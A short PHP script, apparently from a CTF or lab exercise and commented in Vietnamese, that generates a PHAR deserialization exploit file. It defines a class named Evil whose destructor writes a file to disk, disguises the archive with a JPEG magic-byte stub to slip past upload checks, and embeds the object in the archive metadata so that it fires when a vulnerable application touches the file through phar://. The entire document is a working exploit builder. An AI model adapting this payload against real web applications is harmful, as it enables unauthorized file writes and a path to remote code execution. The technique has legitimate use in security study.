<?php
class Evil {
    function __destruct() {
        file_put_contents('info.php', '<?php phpinfo() ?>');
    }
}

@unlink("payload.phar");
$phar = new Phar("payload.phar");
$phar->startBuffering();
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// thêm file dummy
$phar->addFromString("test.txt", "text");

// nhúng object độc hại vào metadata
$object = new Evil();
$phar->setMetadata($object);
$phar->stopBuffering();

echo "payload.phar created!\n";
